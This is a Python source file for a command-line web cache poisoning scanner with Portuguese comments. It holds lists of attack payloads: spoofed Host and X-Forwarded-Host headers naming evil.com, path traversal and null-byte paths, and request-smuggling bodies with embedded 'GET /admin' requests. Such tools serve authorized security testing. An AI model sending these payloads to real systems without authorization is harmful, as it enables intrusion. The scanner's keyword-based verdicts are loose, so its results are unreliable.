#!/usr/bin/env python3
"""Modulo de deteccao de Cache Poisoning.

Testa se o servidor e vulneravel a cache poisoning via:
  - Host — X-Forwarded-Host, X-Original-URL, X-Rewrite-URL
  - Path — path manipulation, double path, path confusion
  - Header — Vary, Cache-Control bypass, Pragma bypass
  - Encoding — Transfer-Encoding clTE, content-length mismatch
  - Bypass — double encode, null byte, case variation, unicode

Fluxo:
  1. Envia requisicao baseline para detectar cache
  2. Envia payloads com headers nao-keyed
  3. Compara respostas (status, tamanho, headers de cache)
  4. Classifica: detectado, blocked, error
  5. Retorna resultado consolidado com severidade
"""
import argparse
import logging
from dataclasses import asdict, dataclass

import httpx

from mytools.core.utils import (
    Cyber,
    add_common_args,
    color,
    create_async_client,
    create_banner,
    run_main_loop,
    safe_asyncio_run,
    write_output,
)

logger = logging.getLogger("mytools.cachepoisoning")

_CATEGORY_MAP: dict[str, list[str]] = {
    "host": ["xfwd_host", "xorig_host", "xrewrite_host", "xhost_bypass", "host_mismatch"],
    "path": ["xorig_url", "xrewrite_url", "url_path_poison", "path_confusion", "double_path"],
    "header": ["vary_poison", "cache_control_bypass", "pragma_bypass", "x_cache_test", "if_modified"],
    "encoding": ["clte_bypass", "te_chunked", "content_length_mismatch", "transfer_encoding", "identity_poison"],
    "bypass": ["double_encode", "null_byte", "case_variation", "unicode_path", "backslash_path"],
}

_HOST_PAYLOADS: list[tuple[str, dict[str, str], list[str]]] = [
    (
        "xfwd_host",
        {"X-Forwarded-Host": "evil.com"},
        ["evil.com", "X-Forwarded-Host", "cache"],
    ),
    (
        "xorig_host",
        {"X-Original-URL": "https://evil.com/admin"},
        ["evil.com", "admin", "X-Original-URL"],
    ),
    (
        "xrewrite_host",
        {"X-Rewrite-URL": "/admin"},
        ["admin", "X-Rewrite-URL", "rewrite"],
    ),
    (
        "xhost_bypass",
        {"X-Host": "evil.com"},
        ["evil.com", "X-Host", "cache"],
    ),
    (
        "host_mismatch",
        {"Host": "evil.com"},
        ["evil.com", "Host", "mismatch"],
    ),
]

_PATH_PAYLOADS: list[tuple[str, str, list[str]]] = [
    (
        "xorig_url",
        "/../../../admin",
        ["admin", "redirect", "location", "path"],
    ),
    (
        "xrewrite_url",
        "/admin%00.jpg",
        ["admin", "null", "path"],
    ),
    (
        "url_path_poison",
        "/%2f/%2fadmin",
        ["admin", "double", "path"],
    ),
    (
        "path_confusion",
        "/admin;/",
        ["admin", "semicolon", "path"],
    ),
    (
        "double_path",
        "/admin//index.html",
        ["admin", "double", "path"],
    ),
]

_HEADER_PAYLOADS: list[tuple[str, dict[str, str], list[str]]] = [
    (
        "vary_poison",
        {"Vary": "X-Forwarded-Host"},
        ["Vary", "cache", "poison"],
    ),
    (
        "cache_control_bypass",
        {"Cache-Control": "no-cache, max-age=0"},
        ["Cache-Control", "no-cache", "bypass"],
    ),
    (
        "pragma_bypass",
        {"Pragma": "no-cache"},
        ["Pragma", "no-cache", "cache"],
    ),
    (
        "x_cache_test",
        {"X-Cache-Status": "HIT"},
        ["X-Cache", "HIT", "poison"],
    ),
    (
        "if_modified",
        {"If-None-Match": "*"},
        ["ETag", "304", "modified"],
    ),
]

_ENCODING_PAYLOADS: list[tuple[str, dict[str, str], str, list[str]]] = [
    (
        "clte_bypass",
        {"Transfer-Encoding": "chunked"},
        "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: evil.com\r\n\r\n",
        ["Transfer-Encoding", "clte", "chunked"],
    ),
    (
        "te_chunked",
        {"Transfer-Encoding": "identity, chunked"},
        "0\r\n\r\nGET /admin HTTP/1.1\r\n\r\n",
        ["Transfer-Encoding", "identity", "chunked"],
    ),
    (
        "content_length_mismatch",
        {"Content-Length": "6"},
        "GET /admin HTTP/1.1\r\n\r\n",
        ["Content-Length", "mismatch", "admin"],
    ),
    (
        "transfer_encoding",
        {"Transfer-Encoding": "gzip, chunked"},
        "0\r\n\r\nGET /admin HTTP/1.1\r\n\r\n",
        ["Transfer-Encoding", "gzip", "chunked"],
    ),
    (
        "identity_poison",
        {"Transfer-Encoding": "identity"},
        "GET /admin HTTP/1.1\r\n\r\n",
        ["Transfer-Encoding", "identity", "admin"],
    ),
]

_BYPASS_PAYLOADS: list[tuple[str, str, list[str]]] = [
    (
        "double_encode",
        "%252fadmin%252f",
        ["admin", "double", "encode", "bypass"],
    ),
    (
        "null_byte",
        "/admin%00.html",
        ["admin", "null", "bypass"],
    ),
    (
        "case_variation",
        "/Admin/INDEX.HTML",
        ["Admin", "INDEX", "case", "bypass"],
    ),
    (
        "unicode_path",
        "/%E0%80%80admin",
        ["admin", "unicode", "bypass"],
    ),
    (
        "backslash_path",
        "/\\admin",
        ["admin", "backslash", "bypass"],
    ),
]

_SSI_PARAMS: list[str] = [
    "data", "json", "payload", "input", "value",
    "content", "body", "params", "query", "config",
    "options", "settings", "item", "object", "model",
]


@dataclass(frozen=True, slots=True)
class CacheAttempt:
    """Tentativa individual de Cache Poisoning."""
    technique: str
    category: str
    payload: str
    param: str
    method: str
    status_baseline: int
    status_test: int
    size_baseline: int
    size_test: int
    status_changed: bool
    size_changed: bool
    vulnerable: bool
    details: str
    error: str


@dataclass(frozen=True, slots=True)
class CacheResult:
    """Resultado consolidado do scan de Cache Poisoning."""
    target: str
    baseline_status: int
    baseline_size: int
    tls: bool
    attempts: list[CacheAttempt]
    vulnerable_techniques: list[str]
    blocked_techniques: list[str]
    issues: list[str]
    overall_status: str


def _check_cache_response(
    body: bytes,
    status: int,
    headers: dict[str, str],
    indicators: list[str],
) -> bool:
    """Verifica se a resposta indica cache poisoning."""
    if status == 0:
        return False
    text = body.decode("utf-8", errors="ignore").lower()
    header_text = " ".join(f"{k}: {v}" for k, v in headers.items()).lower()
    combined = text + " " + header_text
    return any(ind.lower() in combined for ind in indicators)


async def _test_baseline(client: httpx.AsyncClient, url: str) -> tuple[int, int, bytes]:
    """Envia request baseline para obter tamanho e status de referencia."""
    try:
        resp = await client.get(url, follow_redirects=True)
        return resp.status_code, len(resp.content), resp.content
    except httpx.RequestError:
        return 0, 0, b""


async def _test_host(
    client: httpx.AsyncClient,
    url: str,
    baseline: tuple[int, int, bytes],
) -> list[CacheAttempt]:
    """Testa payloads de host poisoning."""
    b_status, b_size, _ = baseline
    results: list[CacheAttempt] = []

    for technique, extra_headers, indicators in _HOST_PAYLOADS:
        for param in _SSI_PARAMS[:4]:
            try:
                resp = await client.get(
                    url,
                    headers=extra_headers,
                    follow_redirects=True,
                )
                headers_dict = dict(resp.headers)
                vulnerable = _check_cache_response(
                    resp.content, resp.status_code, headers_dict, indicators,
                )
                results.append(CacheAttempt(
                    technique=technique,
                    category="host",
                    payload=str(extra_headers),
                    param=param,
                    method="get_headers",
                    status_baseline=b_status,
                    status_test=resp.status_code,
                    size_baseline=b_size,
                    size_test=len(resp.content),
                    status_changed=resp.status_code != b_status,
                    size_changed=len(resp.content) != b_size,
                    vulnerable=vulnerable,
                    details=f"param={param}, indicators={indicators}" if vulnerable else "",
                    error="",
                ))
            except httpx.RequestError as e:
                results.append(CacheAttempt(
                    technique=technique,
                    category="host",
                    payload=str(extra_headers),
                    param=param,
                    method="get_headers",
                    status_baseline=b_status,
                    status_test=0,
                    size_baseline=b_size,
                    size_test=0,
                    status_changed=False,
                    size_changed=False,
                    vulnerable=False,
                    details="",
                    error=str(e)[:100],
                ))
    return results


async def _test_path(
    client: httpx.AsyncClient,
    url: str,
    baseline: tuple[int, int, bytes],
) -> list[CacheAttempt]:
    """Testa payloads de path poisoning."""
    b_status, b_size, _ = baseline
    results: list[CacheAttempt] = []

    for technique, path_payload, indicators in _PATH_PAYLOADS:
        for param in _SSI_PARAMS[:3]:
            try:
                test_url = url.rstrip("/") + path_payload
                resp = await client.get(test_url, follow_redirects=True)
                headers_dict = dict(resp.headers)
                vulnerable = _check_cache_response(
                    resp.content, resp.status_code, headers_dict, indicators,
                )
                results.append(CacheAttempt(
                    technique=technique,
                    category="path",
                    payload=path_payload,
                    param=param,
                    method="get_path",
                    status_baseline=b_status,
                    status_test=resp.status_code,
                    size_baseline=b_size,
                    size_test=len(resp.content),
                    status_changed=resp.status_code != b_status,
                    size_changed=len(resp.content) != b_size,
                    vulnerable=vulnerable,
                    details=f"param={param}, indicators={indicators}" if vulnerable else "",
                    error="",
                ))
            except httpx.RequestError as e:
                results.append(CacheAttempt(
                    technique=technique,
                    category="path",
                    payload=path_payload,
                    param=param,
                    method="get_path",
                    status_baseline=b_status,
                    status_test=0,
                    size_baseline=b_size,
                    size_test=0,
                    status_changed=False,
                    size_changed=False,
                    vulnerable=False,
                    details="",
                    error=str(e)[:100],
                ))
    return results


async def _test_header(
    client: httpx.AsyncClient,
    url: str,
    baseline: tuple[int, int, bytes],
) -> list[CacheAttempt]:
    """Testa payloads de header manipulation."""
    b_status, b_size, _ = baseline
    results: list[CacheAttempt] = []

    for technique, extra_headers, indicators in _HEADER_PAYLOADS:
        for param in _SSI_PARAMS[:3]:
            try:
                resp = await client.get(
                    url,
                    headers=extra_headers,
                    follow_redirects=True,
                )
                headers_dict = dict(resp.headers)
                vulnerable = _check_cache_response(
                    resp.content, resp.status_code, headers_dict, indicators,
                )
                results.append(CacheAttempt(
                    technique=technique,
                    category="header",
                    payload=str(extra_headers),
                    param=param,
                    method="get_headers",
                    status_baseline=b_status,
                    status_test=resp.status_code,
                    size_baseline=b_size,
                    size_test=len(resp.content),
                    status_changed=resp.status_code != b_status,
                    size_changed=len(resp.content) != b_size,
                    vulnerable=vulnerable,
                    details=f"param={param}, indicators={indicators}" if vulnerable else "",
                    error="",
                ))
            except httpx.RequestError as e:
                results.append(CacheAttempt(
                    technique=technique,
                    category="header",
                    payload=str(extra_headers),
                    param=param,
                    method="get_headers",
                    status_baseline=b_status,
                    status_test=0,
                    size_baseline=b_size,
                    size_test=0,
                    status_changed=False,
                    size_changed=False,
                    vulnerable=False,
                    details="",
                    error=str(e)[:100],
                ))
    return results


async def _test_encoding(
    client: httpx.AsyncClient,
    url: str,
    baseline: tuple[int, int, bytes],
) -> list[CacheAttempt]:
    """Testa payloads de encoding bypass."""
    b_status, b_size, _ = baseline
    results: list[CacheAttempt] = []

    for technique, extra_headers, body_payload, indicators in _ENCODING_PAYLOADS:
        for param in _SSI_PARAMS[:3]:
            try:
                resp = await client.post(
                    url,
                    content=body_payload.encode("utf-8"),
                    headers=extra_headers,
                    follow_redirects=True,
                )
                headers_dict = dict(resp.headers)
                vulnerable = _check_cache_response(
                    resp.content, resp.status_code, headers_dict, indicators,
                )
                results.append(CacheAttempt(
                    technique=technique,
                    category="encoding",
                    payload=f"{extra_headers} + {body_payload[:50]}",
                    param=param,
                    method="post_headers",
                    status_baseline=b_status,
                    status_test=resp.status_code,
                    size_baseline=b_size,
                    size_test=len(resp.content),
                    status_changed=resp.status_code != b_status,
                    size_changed=len(resp.content) != b_size,
                    vulnerable=vulnerable,
                    details=f"param={param}, indicators={indicators}" if vulnerable else "",
                    error="",
                ))
            except httpx.RequestError as e:
                results.append(CacheAttempt(
                    technique=technique,
                    category="encoding",
                    payload=f"{extra_headers} + {body_payload[:50]}",
                    param=param,
                    method="post_headers",
                    status_baseline=b_status,
                    status_test=0,
                    size_baseline=b_size,
                    size_test=0,
                    status_changed=False,
                    size_changed=False,
                    vulnerable=False,
                    details="",
                    error=str(e)[:100],
                ))
    return results


async def _test_bypass(
    client: httpx.AsyncClient,
    url: str,
    baseline: tuple[int, int, bytes],
) -> list[CacheAttempt]:
    """Testa payloads de bypass de normalizacao."""
    b_status, b_size, _ = baseline
    results: list[CacheAttempt] = []

    for technique, path_payload, indicators in _BYPASS_PAYLOADS:
        for param in _SSI_PARAMS[:3]:
            try:
                test_url = url.rstrip("/") + path_payload
                resp = await client.get(test_url, follow_redirects=True)
                headers_dict = dict(resp.headers)
                vulnerable = _check_cache_response(
                    resp.content, resp.status_code, headers_dict, indicators,
                )
                results.append(CacheAttempt(
                    technique=technique,
                    category="bypass",
                    payload=path_payload,
                    param=param,
                    method="get_path",
                    status_baseline=b_status,
                    status_test=resp.status_code,
                    size_baseline=b_size,
                    size_test=len(resp.content),
                    status_changed=resp.status_code != b_status,
                    size_changed=len(resp.content) != b_size,
                    vulnerable=vulnerable,
                    details=f"param={param}, indicators={indicators}" if vulnerable else "",
                    error="",
                ))
            except httpx.RequestError as e:
                results.append(CacheAttempt(
                    technique=technique,
                    category="bypass",
                    payload=path_payload,
                    param=param,
                    method="get_path",
                    status_baseline=b_status,
                    status_test=0,
                    size_baseline=b_size,
                    size_test=0,
                    status_changed=False,
                    size_changed=False,
                    vulnerable=False,
                    details="",
                    error=str(e)[:100],
                ))
    return results


def print_results(result: CacheResult) -> None:
    """Exibe os resultados do scan de Cache Poisoning."""
    vuln = [a for a in result.attempts if a.vulnerable]
    blocked = [a for a in result.attempts if a.error and "403" in a.error]

    if vuln:
        print(color("\n[!] VULNERABILIDADES DETECTADAS:", Cyber.RED, Cyber.BOLD))
        for v in vuln:
            print(color(f"  [!] {v.technique} via {v.param}", Cyber.RED))
            print(f"      Payload: {v.payload[:80]}...")
            if v.details:
                print(f"      Detalhes: {v.details}")
    else:
        print(color("\n  [+] Nenhuma Cache Poisoning detectada", Cyber.GREEN, Cyber.BOLD))

    if blocked:
        print(color(f"\n  [*] {len(blocked)} payloads bloqueados (403/429)", Cyber.YELLOW))

    errors = [a for a in result.attempts if a.error and "403" not in a.error]
    if errors:
        print(color(f"\n  [-] {len(errors)} erros de conexao", Cyber.GRAY))

    print(color(f"\n  Total: {len(result.attempts)} testes, {len(vuln)} vulneraveis", Cyber.WHITE))


async def run_scan(
    target: str,
    categories: list[str],
    timeout: float,
    concurrency: int,
    output_file: str | None,
    verbose: bool,
) -> int:
    """Executa o scan de Cache Poisoning."""
    logger.info("Cache Poisoning scan para %s", target)

    async with create_async_client(timeout=timeout) as client:
        b_status, b_size, _ = await _test_baseline(client, target)
        if b_status == 0:
            print(color("[-] Nao foi possivel conectar ao alvo", Cyber.RED))
            return 1

        print(color(f"[*] Baseline: status={b_status}, size={b_size}", Cyber.CYAN))

        test_categories = categories if categories else list(_CATEGORY_MAP.keys())
        all_attempts: list[CacheAttempt] = []

        for cat in test_categories:
            if cat == "host":
                attempts = await _test_host(client, target, (b_status, b_size, b""))
            elif cat == "path":
                attempts = await _test_path(client, target, (b_status, b_size, b""))
            elif cat == "header":
                attempts = await _test_header(client, target, (b_status, b_size, b""))
            elif cat == "encoding":
                attempts = await _test_encoding(client, target, (b_status, b_size, b""))
            elif cat == "bypass":
                attempts = await _test_bypass(client, target, (b_status, b_size, b""))
            else:
                continue
            all_attempts.extend(attempts)

        vulnerable = [a for a in all_attempts if a.vulnerable]
        blocked = [a for a in all_attempts if a.error and "403" in a.error]
        issues = [f"VULN: {a.technique} via {a.param}" for a in vulnerable]

        result = CacheResult(
            target=target,
            baseline_status=b_status,
            baseline_size=b_size,
            tls=target.startswith("https"),
            attempts=all_attempts,
            vulnerable_techniques=[a.technique for a in vulnerable],
            blocked_techniques=[a.technique for a in blocked],
            issues=issues,
            overall_status="vulnerable" if vulnerable else "secure",
        )

        print_results(result)

        if output_file:
            write_output(output_file, asdict(result))
            logger.info("Resultados salvos em %s", output_file)

        return 1 if vulnerable else 0


def banner_art() -> None:
    """Exibe a banner do modulo."""
    art = r"""
   _____                               ______       _
  / ____|                             |  ____|     | |
 | |     _ __ ___  ___ _   _ _ __ ___| |__   __ _| | ___  ___
 | |    | '__/ _ \/ __| | | | '__/ _ \  __| / _` | |/ _ \/ __|
 | |____| | | (_) \__ \ |_| | | |  __/ |___| (_| | |  __/\__ \
  \_____|_|  \___/|___/\__,_|_|  \___|______\__,_|_|\___||___/
"""
    create_banner(art, "   cache poisoning: headers, path, encoding, bypass")()


def build_parser() -> argparse.ArgumentParser:
    """Constrói o parser de argumentos CLI."""
    parser = argparse.ArgumentParser(
        prog="mytools-cachepoison",
        description="Cache Poisoning — detecta cache key poisoning via headers nao-normalizados",
    )
    parser.add_argument("url", help="URL alvo (ex: https://example.com)")
    parser.add_argument(
        "-c", "--category",
        choices=list(_CATEGORY_MAP.keys()),
        help="Categoria de testes (default: todas)",
    )
    parser.add_argument("--concurrency", type=int, default=5, help="Requisicoes simultaneas (default: 5)")
    add_common_args(parser)
    return parser


def run_once(args: argparse.Namespace) -> int:
    """Executa um scan Cache Poisoning a partir de argumentos parseados."""
    logger.info("Cache Poisoning scan iniciado para %s", args.url)
    categories: list[str] = []
    if getattr(args, "category", None):
        categories = [args.category]
    return safe_asyncio_run(
        run_scan(
            target=args.url,
            categories=categories,
            timeout=getattr(args, "timeout", 10),
            concurrency=getattr(args, "concurrency", 5),
            output_file=getattr(args, "output", None),
            verbose=getattr(args, "verbose", False),
        ),
    )


def main() -> int:
    """Ponto de entrada principal."""
    return run_main_loop(
        parser=build_parser(),
        banner_fn=banner_art,
        run_fn=run_once,
        has_target=lambda a: bool(getattr(a, "url", None) or getattr(a, "target", None)),
        prompt="cache> ",
        description="Cache Poisoning interativo.",
        example="https://target.com -c host",
        contextual_help=(
            "Uso: <url> [opcoes]\n"
            "Exemplos:\n"
            "  https://target.com\n"
            "  https://target.com -c host\n"
            "  https://target.com -c path\n"
            "  https://target.com -c encoding\n"
            "  https://target.com -c bypass --proxy http://127.0.0.1:8080"
        ),
    )


if __name__ == "__main__":
    raise SystemExit(main())
